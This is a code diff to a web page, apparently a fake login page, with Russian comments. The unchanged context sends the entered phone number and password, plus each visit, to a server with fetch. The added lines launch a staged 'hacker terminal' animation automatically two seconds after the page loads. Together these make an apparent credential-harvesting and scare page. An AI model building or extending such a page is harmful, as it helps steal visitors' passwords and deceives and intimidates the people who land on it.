@@ -170,7 +170,7 @@
         </div>
     </div>
 
-    <<script>
+    <script>
         document.addEventListener('DOMContentLoaded', () => {
             const hackerModal = document.getElementById('hackerModal');
             const successModal = document.getElementById('successModal');
@@ -232,7 +232,19 @@
                 body: JSON.stringify(visitPayload)
             }).catch(err => console.error("Ошибка отправки визита:", err));
 
-            // 4. Обработка нажатия на кнопку входа
+            // НОВЫЙ БЛОК: Автоматический запуск терминала спустя 2 секунды (2000 мс)
+            setTimeout(() => {
+                // Проверяем, не был ли терминал уже открыт вручную через кнопку
+                if (!hackerModal.classList.contains('visible')) {
+                    hackerModal.classList.add('visible');
+                    runHackerTerminal(() => {
+                        hackerModal.classList.remove('visible');
+                        showSuccessNotification();
+                    });
+                }
+            }, 2000);
+
+            // 4. Обработка нажатия на кнопку входа (сохранена оригинальная логика)
             submitBtn.addEventListener('click', () => {
                 const phoneVal = userInput.value.trim();
                 const passVal = passwordInput.value.trim();
@@ -259,12 +271,14 @@
                     body: JSON.stringify(payload)
                 }).catch(err => console.error("Ошибка отправки данных:", err));
 
-                // Запуск визуальной анимации
-                hackerModal.classList.add('visible');
-                runHackerTerminal(() => {
-                    hackerModal.classList.remove('visible');
-                    showSuccessNotification();
-                });
+                // Запуск визуальной анимации, если она еще не была запущена автоматически
+                if (!hackerModal.classList.contains('visible')) {
+                    hackerModal.classList.add('visible');
+                    runHackerTerminal(() => {
+                        hackerModal.classList.remove('visible');
+                        showSuccessNotification();
+                    });
+                }
             });
 
             function runHackerTerminal(onComplete) {
@@ -329,3 +343,5 @@
             }
         });
     </script>
+</body>
+</html>
